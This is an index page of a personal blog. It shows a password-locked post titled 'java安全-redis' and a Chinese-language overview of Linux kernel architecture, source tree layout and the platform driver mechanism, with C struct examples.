<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"qwq0qwq.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="QWQ0QWQ&#39;s blog">
<meta property="og:url" content="https://qwq0qwq.github.io/page/2/index.html">
<meta property="og:site_name" content="QWQ0QWQ&#39;s blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="QWQ0QWQ">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://qwq0qwq.github.io/page/2/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>QWQ0QWQ's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">QWQ0QWQ's blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">QWQ0QWQ</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">20</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2024/02/10/java%E5%AE%89%E5%85%A8-redis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/02/10/java%E5%AE%89%E5%85%A8-redis/" class="post-title-link" itemprop="url">java安全-redis</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-02-10 21:45:55" itemprop="dateCreated datePublished" datetime="2024-02-10T21:45:55+08:00">2024-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-01-19 10:14:23" itemprop="dateModified" datetime="2025-01-19T10:14:23+08:00">2025-01-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          有东西被加密了, 请输入密码查看.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2024/02/10/java%E5%AE%89%E5%85%A8-redis/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2023/10/11/Linux%E5%86%85%E6%A0%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/10/11/Linux%E5%86%85%E6%A0%B8/" class="post-title-link" itemprop="url">Linux内核</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2023-10-11 07:44:48 / Modified: 07:46:55" itemprop="dateCreated datePublished" datetime="2023-10-11T07:44:48+08:00">2023-10-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Linux内核"><a href="#Linux内核" class="headerlink" title="Linux内核"></a>Linux内核</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>作用是将应用层序的请求传递给硬件，并充当底层驱动程序，对系统中的各种设备和组件进行寻址。目前支持模块的动态装卸(裁剪)。Linux内核就是基于这个策略实现的。Linux进程1.采用层次结构，每个进程都依赖于一个父进程。内核启动init程序作为第一个进程。该进程负责进一步的系统初始化操作。init进程是进程树的根，所有的进程都直接或者间接起源于该进程。virt&#x2F; —- 提供虚拟机技术的支持。</p>
<h2 id="Linux内核预备工作"><a href="#Linux内核预备工作" class="headerlink" title="Linux内核预备工作"></a>Linux内核预备工作</h2><p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/deiew1cwn8.png"></p>
<h3 id="Linux内核的任务："><a href="#Linux内核的任务：" class="headerlink" title="Linux内核的任务："></a>Linux内核的任务：</h3><p>1.从技术层面讲，内核是硬件与软件之间的一个中间层。作用是将应用层序的请求传递给硬件，并充当底层驱动程序，对系统中的各种设备和组件进行寻址。</p>
<p>2.从应用程序的层面讲，应用程序与硬件没有联系，只与内核有联系，内核是应用程序知道的层次中的最底层。在实际工作中内核抽象了相关细节。</p>
<p>3.内核是一个资源管理程序。负责将可用的共享资源(CPU时间、磁盘空间、网络连接等)分配得到各个系统进程。</p>
<p>4.内核就像一个库，提供了一组面向系统的命令。系统调用对于应用程序来说，就像调用普通函数一样。</p>
<h3 id="内核实现策略："><a href="#内核实现策略：" class="headerlink" title="内核实现策略："></a>内核实现策略：</h3><p>1.微内核。最基本的功能由中央内核（微内核）实现。所有其他的功能都委托给一些独立进程，这些进程通过明确定义的通信接口与中心内核通信。</p>
<p>2.宏内核。内核的所有代码，包括子系统（如内存管理、文件管理、设备驱动程序）都打包到一个文件中。内核中的每一个函数都可以访问到内核中所有其他部分。目前支持模块的动态装卸(裁剪)。Linux内核就是基于这个策略实现的。</p>
<h3 id="哪些地方用到了内核机制？"><a href="#哪些地方用到了内核机制？" class="headerlink" title="哪些地方用到了内核机制？"></a>哪些地方用到了内核机制？</h3><p>1.进程（在cpu的虚拟内存中分配地址空间，各个进程的地址空间完全独立;同时执行的进程数最多不超过cpu数目）之间进行通 信，需要使用特定的内核机制。</p>
<p>2.进程间切换(同时执行的进程数最多不超过cpu数目)，也需要用到内核机制。</p>
<p>进程切换也需要像FreeRTOS任务切换一样保存状态，并将进程置于闲置状态&#x2F;恢复状态。</p>
<p>3.进程的调度。确认哪个进程运行多长的时间。</p>
<h3 id="Linux进程"><a href="#Linux进程" class="headerlink" title="Linux进程"></a>Linux进程</h3><p>1.采用层次结构，每个进程都依赖于一个父进程。内核启动init程序作为第一个进程。该进程负责进一步的系统初始化操作。init进程是进程树的根，所有的进程都直接或者间接起源于该进程。</p>
<p>2.通过pstree命令查询。实际上得系统第一个进程是systemd，而不是init（这也是疑问点）</p>
<p>3.系统中每一个进程都有一个唯一标识符(ID),用户（或其他进程）可以使用ID来访问进程。</p>
<h3 id="Linux内核源代码的目录结构"><a href="#Linux内核源代码的目录结构" class="headerlink" title="Linux内核源代码的目录结构"></a>Linux内核源代码的目录结构</h3><p>Linux内核源代码包括三个主要部分：</p>
<ol>
<li>内核核心代码，包括第3章所描述的各个子系统和子模块，以及其它的支撑子系统，例如电源管理、Linux初始化等 </li>
<li>其它非核心代码，例如库文件（因为Linux内核是一个自包含的内核，即内核不依赖其它的任何软件，自己就可以编译通过）、固件集合、KVM（虚拟机技术）等 </li>
<li>编译脚本、配置文件、帮助文档、版权说明等辅助性文件</li>
</ol>
<p>使用ls命令看到的内核源代码的顶层目录结构，具体描述如下。</p>
<p>include&#x2F; —- 内核头文件，需要提供给外部模块（例如用户空间代码）使用。</p>
<p>kernel&#x2F; —- Linux内核的核心代码，包含了3.2小节所描述的进程调度子系统，以及和进程调度相关的模块。</p>
<p>mm&#x2F; —- 内存管理子系统（3.3小节）。</p>
<p>fs&#x2F; —- VFS子系统（3.4小节）。</p>
<p>net&#x2F; —- 不包括网络设备驱动的网络子系统（3.5小节）。</p>
<p>ipc&#x2F; —- IPC（进程间通信）子系统。</p>
<p>arch&#x2F;&#x2F; —- 体系结构相关的代码，例如arm, x86等等。 arch&#x2F;&#x2F;mach- —- 具体的machine&#x2F;board相关的代码。 arch&#x2F;&#x2F;include&#x2F;asm —- 体系结构相关的头文件。 arch&#x2F;&#x2F;boot&#x2F;dts —- 设备树（Device Tree）文件。</p>
<p>init&#x2F; —- Linux系统启动初始化相关的代码。 block&#x2F; —- 提供块设备的层次。 sound&#x2F; —- 音频相关的驱动及子系统，可以看作“音频子系统”。 drivers&#x2F; —- 设备驱动（在Linux kernel 3.10中，设备驱动占了49.4的代码量）。</p>
<p>lib&#x2F; —- 实现需要在内核中使用的库函数，例如CRC、FIFO、list、MD5等。 crypto&#x2F; —– 加密、解密相关的库函数。 security&#x2F; —- 提供安全特性（SELinux）。 virt&#x2F; —- 提供虚拟机技术（KVM等）的支持。 usr&#x2F; —- 用于生成initramfs的代码。 firmware&#x2F; —- 保存用于驱动第三方设备的固件。</p>
<p>samples&#x2F; —- 一些示例代码。 tools&#x2F; —- 一些常用工具，如性能剖析、自测试等。</p>
<p>Kconfig, Kbuild, Makefile, scripts&#x2F; —- 用于内核编译的配置文件、脚本等。</p>
<p>COPYING —- 版权声明。 MAINTAINERS —-维护者名单。 CREDITS —- Linux主要的贡献者名单。 REPORTING-BUGS —- Bug上报的指南。</p>
<p>Documentation, README —- 帮助、说明文档。</p>
<h2 id="Linux内核体系结构简析简析"><a href="#Linux内核体系结构简析简析" class="headerlink" title="Linux内核体系结构简析简析"></a>Linux内核体系结构简析简析</h2><p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/6k7xtr3zfj.png"></p>
<p>最上面是用户（或应用程序）空间。这是用户应用程序执行的地方。用户空间之下是内核空间，Linux 内核正是位于这里。GNU C Library （glibc）也在这里。它提供了连接内核的系统调用接口，还提供了在用户空间应用程序和内核之间进行转换的机制。这点非常重要，因为内核和用户空间的应用程序使用的是不同的保护地址空间。每个用户空间的进程都使用自己的虚拟地址空间，而内核则占用单独的地址空间。</p>
<p>Linux 内核可以进一步划分成 3 层。最上面是系统调用接口，它实现了一些基本的功能，例如 read 和 write。系统调用接口之下是内核代码，可以更精确地定义为独立于体系结构的内核代码。这些代码是 Linux 所支持的所有处理器体系结构所通用的。在这些代码之下是依赖于体系结构的代码，构成了通常称为 BSP（Board Support Package）的部分。这些代码用作给定体系结构的处理器和特定于平台的代码。</p>
<p>Linux 内核实现了很多重要的体系结构属性。在或高或低的层次上，内核被划分为多个子系统。Linux 也可以看作是一个整体，因为它会将所有这些基本服务都集成到内核中。这与微内核的体系结构不同，后者会提供一些基本的服务，例如通信、I&#x2F;O、内存和进程管理，更具体的服务都是插入到微内核层中的。每种内核都有自己的优点，不过这里并不对此进行讨论。</p>
<p>随着时间的流逝，Linux 内核在内存和 CPU 使用方面具有较高的效率，并且非常稳定。但是对于 Linux 来说，最为有趣的是在这种大小和复杂性的前提下，依然具有良好的可移植性。Linux 编译后可在大量处理器和具有不同体系结构约束和需求的平台上运行。一个例子是 Linux 可以在一个具有内存管理单元（MMU）的处理器上运行，也可以在那些不提供 MMU 的处理器上运行。</p>
<p>Linux 内核的 uClinux 移植提供了对非 MMU 的支持。</p>
<p>图2是Linux内核的体系结构</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/mr9z700b4b.png"></p>
<p>图2 Linux内核体系结构</p>
<p>Linux内核的主要组件有：系统调用接口、进程管理、内存管理、虚拟文件系统、网络堆栈、设备驱动程序、硬件架构的相关代码。</p>
<h3 id="（1）系统调用接口"><a href="#（1）系统调用接口" class="headerlink" title="（1）系统调用接口"></a>（1）系统调用接口</h3><p>SCI 层提供了某些机制执行从用户空间到内核的函数调用。正如前面讨论的一样，这个接口依赖于体系结构，甚至在相同的处理器家族内也是如此。SCI 实际上是一个非常有用的函数调用多路复用和多路分解服务。在 .&#x2F;linux&#x2F;kernel 中您可以找到 SCI 的实现，并在 .&#x2F;linux&#x2F;arch 中找到依赖于体系结构的部分。</p>
<h3 id="（2）进程管理"><a href="#（2）进程管理" class="headerlink" title="（2）进程管理"></a>（2）进程管理</h3><p>进程管理的重点是进程的执行。在内核中，这些进程称为线程，代表了单独的处理器虚拟化（线程代码、数据、堆栈和 CPU 寄存器）。在用户空间，通常使用进程 这个术语，不过 Linux 实现并没有区分这两个概念（进程和线程）。内核通过 SCI 提供了一个应用程序编程接口（API）来创建一个新进程（fork、exec 或 Portable Operating System Interface [POSIX] 函数），停止进程（kill、exit），并在它们之间进行通信和同步（signal 或者 POSIX 机制）。</p>
<p>进程管理还包括处理活动进程之间共享 CPU 的需求。内核实现了一种新型的调度算法，不管有多少个线程在竞争 CPU，这种算法都可以在固定时间内进行操作。这种算法就称为 O(1) 调度程序，这个名字就表示它调度多个线程所使用的时间和调度一个线程所使用的时间是相同的。O(1) 调度程序也可以支持多处理器（称为对称多处理器或 SMP）。您可以在 .&#x2F;linux&#x2F;kernel 中找到进程管理的源代码，在 .&#x2F;linux&#x2F;arch 中可以找到依赖于体系结构的源代码。</p>
<h3 id="（3）内存管理"><a href="#（3）内存管理" class="headerlink" title="（3）内存管理"></a>（3）内存管理</h3><p>内核所管理的另外一个重要资源是内存。为了提高效率，如果由硬件管理虚拟内存，内存是按照所谓的内存页 方式进行管理的（对于大部分体系结构来说都是 4KB）。Linux 包括了管理可用内存的方式，以及物理和虚拟映射所使用的硬件机制。不过内存管理要管理的可不止 4KB 缓冲区。Linux 提供了对 4KB 缓冲区的抽象，例如 slab 分配器。这种内存管理模式使用 4KB 缓冲区为基数，然后从中分配结构，并跟踪内存页使用情况，比如哪些内存页是满的，哪些页面没有完全使用，哪些页面为空。这样就允许该模式根据系统需要来动态调整内存使用。为了支持多个用户使用内存，有时会出现可用内存被消耗光的情况。由于这个原因，页面可以移出内存并放入磁盘中。这个过程称为交换，因为页面会被从内存交换到硬盘上。内存管理的源代码可以在 .&#x2F;linux&#x2F;mm 中找到。</p>
<h3 id="（4）虚拟文件系统"><a href="#（4）虚拟文件系统" class="headerlink" title="（4）虚拟文件系统"></a>（4）虚拟文件系统</h3><p>虚拟文件系统（VFS）是 Linux 内核中非常有用的一个方面，因为它为文件系统提供了一个通用的接口抽象。VFS 在 SCI 和内核所支持的文件系统之间提供了一个交换层（请参看图4）。</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/0vrnvpqkps.png"></p>
<p>图3 Linux文件系统层次结构</p>
<p>在 VFS 上面，是对诸如 open、close、read 和 write 之类的函数的一个通用 API 抽象。在 VFS 下面是文件系统抽象，它定义了上层函数的实现方式。它们是给定文件系统（超过 50 个）的插件。文件系统的源代码可以在 .&#x2F;linux&#x2F;fs 中找到。文件系统层之下是缓冲区缓存，它为文件系统层提供了一个通用函数集（与具体文件系统无关）。这个缓存层通过将数据保留一段时间（或者随即预先读取数据以便在需要是就可用）优化了对物理设备的访问。缓冲区缓存之下是设备驱动程序，它实现了特定物理设备的接口。</p>
<h3 id="（5）网络堆栈"><a href="#（5）网络堆栈" class="headerlink" title="（5）网络堆栈"></a>（5）网络堆栈</h3><p>网络堆栈在设计上遵循模拟协议本身的分层体系结构。回想一下，Internet Protocol (IP) 是传输协议（通常称为传输控制协议或 TCP）下面的核心网络层协议。TCP 上面是 socket 层，它是通过 SCI 进行调用的。socket 层是网络子系统的标准 API，它为各种网络协议提供了一个用户接口。从原始帧访问到 IP 协议数据单元（PDU），再到 TCP 和 User Datagram Protocol (UDP)，socket 层提供了一种标准化的方法来管理连接，并在各个终点之间移动数据。内核中网络源代码可以在 .&#x2F;linux&#x2F;net 中找到。</p>
<h3 id="（6）设备驱动程序"><a href="#（6）设备驱动程序" class="headerlink" title="（6）设备驱动程序"></a>（6）设备驱动程序</h3><p>Linux 内核中有大量代码都在设备驱动程序中，它们能够运转特定的硬件设备。Linux 源码树提供了一个驱动程序子目录，这个目录又进一步划分为各种支持设备，例如 Bluetooth、I2C、serial 等。设备驱动程序的代码可以在 .&#x2F;linux&#x2F;drivers 中找到。</p>
<h3 id="（7）依赖体系结构的代码"><a href="#（7）依赖体系结构的代码" class="headerlink" title="（7）依赖体系结构的代码"></a>（7）依赖体系结构的代码</h3><p>尽管 Linux 很大程度上独立于所运行的体系结构，但是有些元素则必须考虑体系结构才能正常操作并实现更高效率。.&#x2F;linux&#x2F;arch 子目录定义了内核源代码中依赖于体系结构的部分，其中包含了各种特定于体系结构的子目录（共同组成了 BSP）。对于一个典型的桌面系统来说，使用的是 x86 目录。每个体系结构子目录都包含了很多其他子目录，每个子目录都关注内核中的一个特定方面，例如引导、内核、内存管理等。这些依赖体系结构的代码可以在 .&#x2F;linux&#x2F;arch 中找到。</p>
<p>如果 Linux 内核的可移植性和效率还不够好，Linux 还提供了其他一些特性，它们无法划分到上面的分类中。作为一个生产操作系统和开源软件，Linux 是测试新协议及其增强的良好平台。Linux 支持大量网络协议，包括典型的 TCP&#x2F;IP，以及高速网络的扩展（大于 1 Gigabit Ethernet [GbE] 和 10 GbE）。Linux 也可以支持诸如流控制传输协议（SCTP）之类的协议，它提供了很多比 TCP 更高级的特性（是传输层协议的接替者）。</p>
<p>Linux 还是一个动态内核，支持动态添加或删除软件组件。被称为动态可加载内核模块，它们可以在引导时根据需要（当前特定设备需要这个模块）或在任何时候由用户插入。</p>
<p>Linux 最新的一个增强是可以用作其他操作系统的操作系统（称为系统管理程序）。最近，对内核进行了修改，称为基于内核的虚拟机（KVM）。这个修改为用户空间启用了一个新的接口，它可以允许其他操作系统在启用了 KVM 的内核之上运行。除了运行 Linux 的其他实例之外， Microsoft Windows也可以进行虚拟化。惟一的限制是底层处理器必须支持新的虚拟化指令。</p>
<h2 id="Linux体系结构和内核结构区别"><a href="#Linux体系结构和内核结构区别" class="headerlink" title="Linux体系结构和内核结构区别"></a>Linux体系结构和内核结构区别</h2><p>1．当被问到Linux体系结构（就是Linux系统是怎么构成的）时，我们可以参照下图这么回答：从大的方面讲，Linux体系结构可以分为两块：</p>
<p>（1）用户空间：用户空间中又包含了，用户的应用程序，C库</p>
<p>（2）内核空间：内核空间包括，系统调用，内核，以及与平台架构相关的代码 </p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/8j6htgpgqp.png"></p>
<p>2．Linux体系结构要分成用户空间和内核空间的原因：</p>
<p>1）现代CPU通常都实现了不同的工作模式，</p>
<p>以ARM为例：ARM实现了7种工作模式，不同模式下CPU可以执行的指令或者访问的寄存器不同：</p>
<p>（1）用户模式 usr</p>
<p>（2）系统模式 sys</p>
<p>（3）管理模式 svc</p>
<p>（4）快速中断 fiq</p>
<p>（5）外部中断 irq</p>
<p>（6）数据访问终止 abt</p>
<p>（7）未定义指令异常</p>
<p>以（2）X86为例：X86实现了4个不同级别的权限，Ring0—Ring3 ;Ring0下可以执行特权指令，可以访问IO设备；Ring3则有很多的限制</p>
<p>2）所以，Linux从CPU的角度出发，为了保护内核的安全，把系统分成了2部分；</p>
<p>3．用户空间和内核空间是程序执行的两种不同状态，我们可以通过“系统调用”和“硬件中断“来完成用户空间到内核空间的转移</p>
<p>4．Linux的内核结构（注意区分LInux体系结构和Linux内核结构）</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/9hjq3174p5.png"></p>
<h2 id="Linux驱动的platform机制"><a href="#Linux驱动的platform机制" class="headerlink" title="Linux驱动的platform机制"></a>Linux驱动的platform机制</h2><p>Linux的这种platform driver机制和传统的device_driver机制相比，一个十分明显的优势在于platform机制将本身的资源注册进内核，由内核统一管理，在驱动程序中使用这些资源时通过platform_device提供的标准接口进行申请并使用。这样提高了驱动和资源管理的独立性，并且拥有较好的可移植性和安全性。下面是SPI驱动层次示意图，Linux中的SPI总线可理解为SPI控制器引出的总线：</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-7557625/731chu3vhr.png"></p>
<p>和传统的驱动一样，platform机制也分为三个步骤：</p>
<h3 id="1、总线注册阶段："><a href="#1、总线注册阶段：" class="headerlink" title="1、总线注册阶段："></a>1、总线注册阶段：</h3><p>内核启动初始化时的main.c文件中的kernel_init()→do_basic_setup()→driver_init()→platform_bus_init()→bus_register(&amp;platform_bus_type)，注册了一条platform总线（虚拟总线，platform_bus）。</p>
<h3 id="2、添加设备阶段："><a href="#2、添加设备阶段：" class="headerlink" title="2、添加设备阶段："></a>2、添加设备阶段：</h3><p>设备注册的时候Platform_device_register()→platform_device_add()→(pdev→dev.bus &#x3D; &amp;platform_bus_type)→device_add()，就这样把设备给挂到虚拟的总线上。</p>
<h3 id="3、驱动注册阶段："><a href="#3、驱动注册阶段：" class="headerlink" title="3、驱动注册阶段："></a>3、驱动注册阶段：</h3><p>Platform_driver_register()→driver_register()→bus_add_driver()→driver_attach()→bus_for_each_dev(), 对在每个挂在虚拟的platform bus的设备作__driver_attach()→driver_probe_device(),判断drv→bus→match()是否执行成功，此时通过指针执行platform_match→strncmp(pdev→name , drv→name , BUS_ID_SIZE),如果相符就调用really_probe(实际就是执行相应设备的platform_driver→probe(platform_device)。)开始真正的探测，如果probe成功，则绑定设备到该驱动。</p>
<p>从上面可以看出，platform机制最后还是调用了bus_register() , device_add() , driver_register()这三个关键的函数。</p>
<p>下面看几个结构体：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct platform_device           </span><br><span class="line">(<span class="regexp">/include/</span>linux/<span class="title class_">Platform</span>_device.<span class="property">h</span>)</span><br><span class="line">&#123;        </span><br><span class="line"><span class="keyword">const</span> char    * name;        </span><br><span class="line">int        id;        </span><br><span class="line">struct device    dev;        </span><br><span class="line">u32        num_resources;        </span><br><span class="line">struct resource    * resource;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>Platform_device结构体描述了一个platform结构的设备，在其中包含了一般设备的结构体struct device dev;设备的资源结构体struct resource * resource;还有设备的名字const char * name。（注意，这个名字一定要和后面platform_driver.driver àname相同，原因会在后面说明。）</p>
<p>该结构体中最重要的就是resource结构，这也是之所以引入platform机制的原因。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct resource                            </span><br><span class="line">( <span class="regexp">/include/</span>linux/ioport.<span class="property">h</span>)</span><br><span class="line">&#123;        </span><br><span class="line">resource_size_t start;        </span><br><span class="line">resource_size_t end;        </span><br><span class="line"><span class="keyword">const</span> char *name;        </span><br><span class="line">unsigned long flags;        </span><br><span class="line">struct resource *parent, *sibling, *child;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>其中 flags位表示该资源的类型，start和end分别表示该资源的起始地址和结束地址(&#x2F;include&#x2F;linux&#x2F;Platform_device.h)：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct platform_driver              </span><br><span class="line">&#123;        </span><br><span class="line">int (*probe)(struct platform_device *);        </span><br><span class="line">int (*remove)(struct platform_device *);        </span><br><span class="line"><span class="keyword">void</span> (*shutdown)(struct platform_device *);        </span><br><span class="line">int (*suspend)(struct platform_device *, pm_message_t state);        </span><br><span class="line">int (*suspend_late)(struct platform_device *, pm_message_t state);        </span><br><span class="line">int (*resume_early)(struct platform_device *);        </span><br><span class="line">int (*resume)(struct platform_device *);        </span><br><span class="line">struct device_driver driver;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>Platform_driver结构体描述了一个platform结构的驱动。其中除了一些函数指针外，还有一个一般驱动的device_driver结构。 名字要一致的原因：</p>
<p>上面说的驱动在注册的时候会调用函数bus_for_each_dev(), 对在每个挂在虚拟的platform bus的设备作__driver_attach()→driver_probe_device(),在此函数中会对dev和drv做初步的匹配，调用的是drv-&gt;bus-&gt;match所指向的函数。platform_driver_register函数中drv-&gt;driver.bus &#x3D; &amp;platform_bus_type，所以drv-&gt;bus-&gt;match就为platform_bus_type→match,为platform_match函数，该函数如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> int <span class="title function_">platform_match</span>(<span class="params">struct device * dev, struct device_driver * drv</span>)   </span><br><span class="line">&#123;       </span><br><span class="line">struct platform_device *pdev = <span class="title function_">container_of</span>(dev, struct platform_device, dev);</span><br><span class="line"><span class="keyword">return</span> (<span class="title function_">strncmp</span>(pdev-&gt;name, drv-&gt;name, <span class="variable constant_">BUS_ID_SIZE</span>) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>是比较dev和drv的name，相同则会进入really_probe（）函数，从而进入自己写的probe函数做进一步的匹配。所以dev→name和driver→drv→name在初始化时一定要填一样的。</p>
<p>不同类型的驱动，其match函数是不一样的，这个platform的驱动，比较的是dev和drv的名字，还记得usb类驱动里的match吗？它比较的是Product ID和Vendor ID。</p>
<p>个人总结Platform机制的好处：</p>
<p>1、提供platform_bus_type类型的总线，把那些不是总线型的soc设备都添加到这条虚拟总线上。使得，总线——设备——驱动的模式可以得到普及。</p>
<p>2、提供platform_device和platform_driver类型的数据结构，将传统的device和driver数据结构嵌入其中，并且加入resource成员，以便于和Open Firmware这种动态传递设备资源的新型bootloader和kernel 接轨。</p>
